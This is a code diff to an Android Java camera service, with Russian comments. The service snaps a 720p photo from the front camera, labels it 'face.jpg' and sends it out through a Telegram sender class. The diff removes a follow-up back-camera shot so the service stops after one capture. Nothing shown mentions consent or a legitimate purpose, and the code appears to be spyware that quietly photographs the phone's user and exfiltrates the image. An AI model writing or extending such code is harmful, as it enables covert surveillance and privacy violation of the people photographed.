@@ -32,20 +32,19 @@ public class CameraService extends Service {
         startForeground(1, n);
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-        capturePhoto("front", "1"); 
+        capturePhoto("face", "1"); // 1 = фронтальная
         return START_NOT_STICKY;
     }
 
     private void capturePhoto(String tag, String id) {
         try {
-            // Узнаем правильное разрешение для конкретной камеры
             android.hardware.camera2.params.StreamConfigurationMap map = 
                 manager.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
             android.util.Size[] sizes = map.getOutputSizes(ImageFormat.YUV_420_888);
             android.util.Size bestSize = sizes[0];
             for (android.util.Size s : sizes) {
-                if (s.getWidth() <= 1280 && s.getHeight() <= 1280) {
-                    bestSize = s; break; // Берем разрешение не больше 720p для скорости
+                if (s.getWidth() == 1280 && s.getHeight() == 720) {
+                    bestSize = s; break;
                 }
             }
 
@@ -74,21 +73,12 @@ public class CameraService extends Service {
                         
                         YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
                         ByteArrayOutputStream out = new ByteArrayOutputStream();
-                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 90, out);
+                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 80, out);
                         
                         new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                         
                         img.close(); r.close(); device.close();
-                        
-                        // Небольшая задержка, чтобы система освободила камеру
-                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                            if (tag.equals("front")) {
-                                capturePhoto("back", "0");
-                            } else {
-                                stopSelf();
-                            }
-                        }, 1000); // 1 секунда паузы
-                        
+                        stopSelf();
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
